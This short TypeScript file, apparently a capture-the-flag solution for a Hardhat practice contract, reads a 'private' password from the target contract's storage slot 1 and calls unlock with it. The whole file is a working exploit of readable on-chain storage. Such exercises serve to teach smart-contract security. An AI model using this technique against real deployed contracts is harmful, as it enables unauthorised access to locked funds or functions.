import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const pass = await waffle.provider.getStorageAt(victim.address, 1);
  await victim.unlock(pass);
};

export default helper;
